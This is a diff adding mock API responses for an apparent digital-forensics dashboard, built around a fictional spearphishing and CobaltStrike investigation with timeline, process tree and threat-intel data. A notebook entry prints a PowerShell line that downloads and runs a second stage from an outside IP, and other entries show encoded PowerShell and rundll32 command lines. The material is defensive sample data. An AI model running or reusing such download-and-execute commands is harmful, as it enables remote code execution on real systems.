+  if (/^\/dfir\/investigations\/(\d+)$/.test(p)) {
+    const iid = parseInt(p.split('/')[3]);
+    const inv = [
+      { id: 101, investigation_id: 'INV-9999-00101', case_id: 'CASE-2026-0042', title: 'Spearphishing → CobaltStrike Beacon', incident_id: 77, analyst: 'analyst-1', priority: 'critical', status: 'in_progress', classification: 'TLP:AMBER', tags: 'phishing,cobalt-strike,c2', notes: 'User opened malicious macro. PowerShell spawned from WINWORD.EXE. C2 established to 185.220.101.47. Lateral movement via SMB to DC01.', target_hosts: 'WORKSTATION-01,SERVER-DC01', target_users: 'john.smith,svc-backup', mitre_techniques: 'T1566.001,T1059.001,T1071.001,T1021.002,T1041', root_cause: 'Malicious macro-enabled Excel file delivered via spearphishing email opened by finance user.', executive_summary: 'CobaltStrike beacon deployed after phishing. Lateral movement to DC observed. Data staged for exfiltration.', version: 3, evidence_count: 12, created_at: new Date(Date.now() - 3600000).toISOString(), updated_at: new Date(Date.now() - 1800000).toISOString() },
+    ].find(i => i.id === iid);
+    if (inv) return ok(inv);
+    return ok({ id: iid, investigation_id: `INV-9999-0${iid}`, case_id: '', title: 'Investigation', analyst: 'analyst-1', priority: 'medium', status: 'open', classification: '', tags: '', notes: '', target_hosts: 'WORKSTATION-01', target_users: '', mitre_techniques: '', root_cause: '', executive_summary: '', version: 1, evidence_count: 0, created_at: new Date().toISOString(), updated_at: new Date().toISOString() });
+  }
+  if (p === '/dfir/evidence' || p.startsWith('/dfir/evidence?') || /^\/dfir\/investigations\/\d+\/evidence/.test(p)) return ok([
+    { id: 1, evidence_id: 'EV-101-00001-processes', investigation_id: 101, type: 'process_list', label: 'Running Processes — WORKSTATION-01', description: 'Full process snapshot from WORKSTATION-01', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'a1b2c3d4e5f6', md5: '1a2b3c4d', size_bytes: 45056, status: 'collected', collected_at: new Date(Date.now() - 3500000).toISOString() },
+    { id: 2, evidence_id: 'EV-101-00001-connections', investigation_id: 101, type: 'network_capture', label: 'Network Connections — WORKSTATION-01', description: 'Active network connections at time of incident', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'b2c3d4e5f6a1', md5: '2b3c4d1a', size_bytes: 128512, status: 'collected', collected_at: new Date(Date.now() - 3400000).toISOString() },
+    { id: 3, evidence_id: 'EV-101-00001-event_logs', investigation_id: 101, type: 'event_logs', label: 'Event Logs — WORKSTATION-01', description: 'Windows Security and System event logs', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'c3d4e5f6a1b2', md5: '3c4d1a2b', size_bytes: 2097152, status: 'analyzed', collected_at: new Date(Date.now() - 3300000).toISOString() },
+    { id: 4, evidence_id: 'EV-101-00001-memory', investigation_id: 101, type: 'memory_dump', label: 'Memory Dump — WORKSTATION-01', description: 'Full physical memory dump (8GB)', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'd4e5f6a1b2c3', md5: '4d1a2b3c', size_bytes: 8589934592, status: 'collected', collected_at: new Date(Date.now() - 3200000).toISOString() },
+    { id: 5, evidence_id: 'EV-101-00001-file_hashes', investigation_id: 101, type: 'file_hash_list', label: 'File Inventory — SERVER-DC01', description: 'File hash inventory from domain controller', source_host: 'SERVER-DC01', collector: 'analyst-1', sha256: 'e5f6a1b2c3d4', md5: '5e1a2b3c', size_bytes: 4096000, status: 'collected', collected_at: new Date(Date.now() - 3100000).toISOString() },
+  ]);
+  if (/^\/dfir\/evidence\/\d+$/.test(p)) {
+    const eid = parseInt(p.split('/')[3]);
+    return ok({ id: eid, evidence_id: `EV-101-0000${eid}`, investigation_id: 101, type: 'process_list', label: `Evidence Item ${eid}`, description: 'Collected artifact', source_host: 'WORKSTATION-01', collector: 'analyst-1', sha256: 'a1b2c3d4e5f6', md5: '1a2b3c4d', size_bytes: 45056, storage_location: 'xcloak://evidence/9999/101/processes', status: 'collected', analysis_result: null, collected_at: new Date().toISOString() });
+  }
+  if (/^\/dfir\/evidence\/\d+\/custody$/.test(p)) return ok([
+    { id: 1, action: 'collected', actor: 'analyst-1', location: 'WORKSTATION-01', notes: 'Initial collection via remote agent', hash_verified: false, created_at: new Date(Date.now() - 3500000).toISOString() },
+    { id: 2, action: 'transferred', actor: 'analyst-1', location: 'xcloak-evidence-store-1', notes: 'Transferred to secure evidence storage', hash_verified: true, created_at: new Date(Date.now() - 3000000).toISOString() },
+    { id: 3, action: 'analyzed', actor: 'analyst-2', location: 'analyst-2-workstation', notes: 'Memory analysis performed with Volatility 3', hash_verified: true, created_at: new Date(Date.now() - 2000000).toISOString() },
+  ]);
+  if (/^\/dfir\/investigations\/\d+\/tasks$/.test(p)) return ok([
+    { id: 1, target_host: 'WORKSTATION-01', collection_type: 'targeted', artifacts: 'processes,connections,event_logs,file_hashes', status: 'completed', requested_by: 'analyst-1', evidence_count: 4, result_summary: 'Collected 4 artifact sets from WORKSTATION-01', created_at: new Date(Date.now() - 3500000).toISOString(), completed_at: new Date(Date.now() - 3400000).toISOString() },
+    { id: 2, target_host: 'SERVER-DC01', collection_type: 'targeted', artifacts: 'event_logs,users,file_hashes', status: 'completed', requested_by: 'analyst-1', evidence_count: 3, result_summary: 'Collected 3 artifact sets from SERVER-DC01', created_at: new Date(Date.now() - 2000000).toISOString(), completed_at: new Date(Date.now() - 1900000).toISOString() },
+  ]);
+  if (/^\/dfir\/investigations\/\d+\/timeline$/.test(p)) return ok([
+    { id: 1, event_time: new Date(Date.now() - 7200000).toISOString(), event_type: 'alert', source: 'xcloak', host: 'WORKSTATION-01', user_name: 'john.smith', description: 'Suspicious PowerShell execution detected', severity: 'critical', mitre_technique: 'T1059.001', is_manual: false },
+    { id: 2, event_time: new Date(Date.now() - 7140000).toISOString(), event_type: 'command', source: 'audit', host: 'WORKSTATION-01', user_name: 'john.smith', description: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', severity: 'critical', mitre_technique: 'T1059.001', is_manual: false },
+    { id: 3, event_time: new Date(Date.now() - 7080000).toISOString(), event_type: 'process', source: 'sysmon', host: 'WORKSTATION-01', user_name: 'john.smith', description: 'WINWORD.EXE spawned cmd.exe → powershell.exe', severity: 'high', mitre_technique: 'T1059.001', is_manual: false },
+    { id: 4, event_time: new Date(Date.now() - 7020000).toISOString(), event_type: 'registry', source: 'sysmon', host: 'WORKSTATION-01', user_name: 'john.smith', description: 'Registry key set: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32', severity: 'critical', mitre_technique: 'T1547.001', is_manual: false },
+    { id: 5, event_time: new Date(Date.now() - 6900000).toISOString(), event_type: 'network', source: 'netflow', host: 'WORKSTATION-01', user_name: '', description: 'HTTPS connection to 185.220.101.47:443 (update-cdn-service.com)', severity: 'high', mitre_technique: 'T1071.001', is_manual: false },
+    { id: 6, event_time: new Date(Date.now() - 6600000).toISOString(), event_type: 'alert', source: 'xcloak', host: 'SERVER-DC01', user_name: 'svc-backup', description: 'SMB lateral movement from WORKSTATION-01 to SERVER-DC01', severity: 'critical', mitre_technique: 'T1021.002', is_manual: false },
+    { id: 7, event_time: new Date(Date.now() - 5400000).toISOString(), event_type: 'network', source: 'netflow', host: 'WORKSTATION-01', user_name: '', description: 'Large data transfer (2.1GB) to 185.220.101.47:443', severity: 'critical', mitre_technique: 'T1041', is_manual: false },
+    { id: 8, event_time: new Date(Date.now() - 3600000).toISOString(), event_type: 'analyst', source: 'dfir', host: '', user_name: 'analyst-1', description: 'Investigation opened. Host isolated. Credentials reset for john.smith.', severity: 'info', mitre_technique: '', is_manual: true },
+  ]);
+  if (/^\/dfir\/investigations\/\d+\/process-tree$/.test(p)) return ok({
+    total: 18,
+    processes: [
+      { pid: 4, ppid: 0, process_name: 'System', cmdline: '', username: 'SYSTEM', exe_path: '', host: 'WORKSTATION-01', children: [] },
+      { pid: 628, ppid: 4, process_name: 'lsass.exe', cmdline: '', username: 'SYSTEM', exe_path: 'C:\\Windows\\System32\\lsass.exe', host: 'WORKSTATION-01', children: [] },
+      { pid: 1032, ppid: 700, process_name: 'WINWORD.EXE', cmdline: 'WINWORD.EXE /n invoice_Q3.xlsm', username: 'john.smith', exe_path: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', host: 'WORKSTATION-01', children: [
+        { pid: 2048, ppid: 1032, process_name: 'cmd.exe', cmdline: 'cmd.exe /c powershell -enc SQBFAFgA', username: 'john.smith', exe_path: 'C:\\Windows\\System32\\cmd.exe', host: 'WORKSTATION-01', children: [
+          { pid: 2144, ppid: 2048, process_name: 'powershell.exe', cmdline: 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', username: 'john.smith', exe_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', host: 'WORKSTATION-01', children: [
+            { pid: 2312, ppid: 2144, process_name: 'rundll32.exe', cmdline: 'rundll32.exe C:\\Users\\john.smith\\AppData\\Local\\Temp\\svc32.dll,DllRegisterServer', username: 'john.smith', exe_path: 'C:\\Windows\\System32\\rundll32.exe', host: 'WORKSTATION-01', children: [
+              { pid: 2488, ppid: 2312, process_name: 'svchost32.exe', cmdline: 'svchost32.exe', username: 'john.smith', exe_path: 'C:\\Users\\john.smith\\AppData\\Local\\Temp\\svchost32.exe', host: 'WORKSTATION-01', children: [] }
+            ]}
+          ]}
+        ]}
+      ]},
+    ],
+  });
+  if (/^\/dfir\/investigations\/\d+\/network$/.test(p)) return ok([
+    { id: 1, protocol: 'TCP', local_address: '10.0.1.55:49821', remote_address: '185.220.101.47:443', state: 'ESTABLISHED', process_name: 'svchost32.exe', country: 'NL', host: 'WORKSTATION-01', collected_at: new Date(Date.now() - 6900000).toISOString() },
+    { id: 2, protocol: 'TCP', local_address: '10.0.1.55:49822', remote_address: '185.220.101.47:443', state: 'CLOSE_WAIT', process_name: 'svchost32.exe', country: 'NL', host: 'WORKSTATION-01', collected_at: new Date(Date.now() - 6000000).toISOString() },
+    { id: 3, protocol: 'TCP', local_address: '10.0.1.55:445', remote_address: '10.0.1.10:49901', state: 'ESTABLISHED', process_name: 'System', country: '', host: 'WORKSTATION-01', collected_at: new Date(Date.now() - 6600000).toISOString() },
+    { id: 4, protocol: 'UDP', local_address: '10.0.1.55:53', remote_address: '8.8.8.8:53', state: 'LISTEN', process_name: 'svchost.exe', country: 'US', host: 'WORKSTATION-01', collected_at: new Date(Date.now() - 5000000).toISOString() },
+  ]);
+  if (/^\/dfir\/investigations\/\d+\/artifacts$/.test(p)) return ok({
+    platform: sp.get('platform') || 'windows',
+    available: ['mft', 'usn_journal', 'amcache', 'shimcache', 'srum', 'prefetch', 'jump_lists', 'registry_hives'],
+    artifact_type: sp.get('artifact') || '',
+    entries: [
+      { host: 'WORKSTATION-01', log_source: 'prefetch', message: 'C:\\Windows\\Prefetch\\POWERSHELL.EXE-06AC6714.pf — 27 executions, last run 2026-07-10T08:15:42Z', timestamp: new Date(Date.now() - 7080000).toISOString() },
+      { host: 'WORKSTATION-01', log_source: 'amcache', message: 'svchost32.exe — SHA1: aabbccddeeff, First execution: 2026-07-10T08:16:01Z', timestamp: new Date(Date.now() - 7020000).toISOString() },
+      { host: 'WORKSTATION-01', log_source: 'shimcache', message: 'rundll32.exe — Last modified: 2026-07-10T08:15:58Z — NOT shimmed previously (suspicious)', timestamp: new Date(Date.now() - 7000000).toISOString() },
+    ],
+  });
+  if (/^\/dfir\/investigations\/\d+\/notebook$/.test(p)) return ok([
+    { id: 1, entry_type: 'note', title: 'Initial Triage', content: '## Initial Triage\n\nUser reported suspicious pop-up at 08:20. SOC alert triggered at 08:22 for encoded PowerShell execution.\n\n**Actions taken:**\n- Host isolated at 08:35\n- User credentials reset at 08:40\n- Memory dump initiated', author: 'analyst-1', evidence_refs: '1,2', tags: 'triage,initial', created_at: new Date(Date.now() - 3400000).toISOString(), updated_at: new Date(Date.now() - 3400000).toISOString() },
+    { id: 2, entry_type: 'evidence', title: 'Decoded PowerShell Payload', content: '```powershell\nIEX (New-Object Net.WebClient).DownloadString("http://185.220.101.47/stage2.ps1")\n```\n\nPayload downloads second-stage beacon from C2. Reflective DLL injection into notepad.exe observed.', author: 'analyst-1', evidence_refs: '3', tags: 'malware,c2', created_at: new Date(Date.now() - 3000000).toISOString(), updated_at: new Date(Date.now() - 3000000).toISOString() },
+    { id: 3, entry_type: 'query', title: 'Hunt Query — Encoded PS on All Hosts', content: 'SELECT hostname, cmdline, created_at FROM endpoint_processes WHERE cmdline ILIKE \'%-enc %\' ORDER BY created_at DESC', author: 'analyst-2', evidence_refs: '', tags: 'hunt,powershell', created_at: new Date(Date.now() - 2000000).toISOString(), updated_at: new Date(Date.now() - 2000000).toISOString() },
+  ]);
+  if (/^\/dfir\/investigations\/\d+\/graph$/.test(p)) return ok({
+    nodes: [
+      { id: 'inv-101', label: 'Spearphishing → CobaltStrike', type: 'investigation' },
+      { id: 'host-WORKSTATION-01', label: 'WORKSTATION-01', type: 'host' },
+      { id: 'host-SERVER-DC01', label: 'SERVER-DC01', type: 'host' },
+      { id: 'user-john.smith', label: 'john.smith', type: 'user' },
+      { id: 'proc-WINWORD.EXE', label: 'WINWORD.EXE', type: 'process' },
+      { id: 'proc-powershell.exe', label: 'powershell.exe', type: 'process' },
+      { id: 'proc-svchost32.exe', label: 'svchost32.exe', type: 'process' },
+      { id: 'ioc-185.220.101.47', label: '185.220.101.47', type: 'network' },
+      { id: 'mitre-T1566.001', label: 'T1566.001', type: 'mitre' },
+      { id: 'mitre-T1059.001', label: 'T1059.001', type: 'mitre' },
+      { id: 'actor-APT29', label: 'APT29 (suspected)', type: 'threat_actor' },
+    ],
+    edges: [
+      { from: 'inv-101', to: 'host-WORKSTATION-01', label: 'targets' },
+      { from: 'inv-101', to: 'host-SERVER-DC01', label: 'targets' },
+      { from: 'host-WORKSTATION-01', to: 'user-john.smith', label: 'logged_in' },
+      { from: 'host-WORKSTATION-01', to: 'proc-WINWORD.EXE', label: 'runs' },
+      { from: 'proc-WINWORD.EXE', to: 'proc-powershell.exe', label: 'spawns' },
+      { from: 'proc-powershell.exe', to: 'proc-svchost32.exe', label: 'injects' },
+      { from: 'proc-svchost32.exe', to: 'ioc-185.220.101.47', label: 'connects' },
+      { from: 'inv-101', to: 'mitre-T1566.001', label: 'maps_to' },
+      { from: 'inv-101', to: 'mitre-T1059.001', label: 'maps_to' },
+      { from: 'actor-APT29', to: 'inv-101', label: 'suspected' },
+    ],
+  });
+  if (/^\/dfir\/investigations\/\d+\/threat-intel$/.test(p)) return ok({
+    threat_actors: [{ name: 'APT29 (Cozy Bear)', aliases: ['The Dukes', 'IRON HEMLOCK'], motivation: 'Espionage', ttps: ['T1566.001', 'T1059.001', 'T1071.001'] }],
+    malware_families: [{ name: 'CobaltStrike', type: 'C2 Framework', c2: 'HTTPS/DNS', capabilities: ['Process injection', 'Keylogging', 'Lateral movement'] }],
+    ioc_matches: [{ ioc: '185.220.101.47', type: 'ip', reputation: 'malicious', context: 'Known Tor exit node used for C2' }, { ioc: 'update-cdn-service.com', type: 'domain', reputation: 'malicious', context: 'Registered 2 days before attack, parked on bulletproof hosting' }],
+    campaigns: [{ name: 'Operation DarkStar', actor: 'APT29', timeframe: '2026-Q2', target_sectors: ['Finance', 'Government', 'Healthcare'] }],
+    cves: [{ id: 'CVE-2025-21298', cvss: 9.8, description: 'Office OLE memory corruption — used for initial exploitation' }],
+    attribution_confidence: 72,
+    executive_brief: 'High confidence attribution to APT29 based on C2 infrastructure, beacon configuration, and TTP overlap with known campaigns.',
+  });
+  if (p === '/dfir/analytics') return ok({
+    by_priority: [{ label: 'critical', value: 3 }, { label: 'high', value: 5 }, { label: 'medium', value: 3 }, { label: 'low', value: 1 }],
+    by_status: [{ label: 'open', value: 5 }, { label: 'in_progress', value: 3 }, { label: 'closed', value: 4 }],
+    by_evidence_type: [{ label: 'event_logs', value: 18 }, { label: 'process_list', value: 12 }, { label: 'network_capture', value: 9 }, { label: 'memory_dump', value: 3 }, { label: 'file_hash_list', value: 5 }],
+    daily: Array.from({ length: 14 }, (_, i) => ({ day: new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10), count: Math.floor(Math.random() * 3) })),
+    avg_mttr_hours: 18.4,
+  });
+  if (p.startsWith('/dfir/search')) return ok({ query: sp.get('q') || '', results: [], total: 0 });
 
   // ── MDM — getDevices() reads res.data?.devices ───────────────────────────
   if (p === '/mdm/devices')             return ok({ devices: MDM_DEVICES });
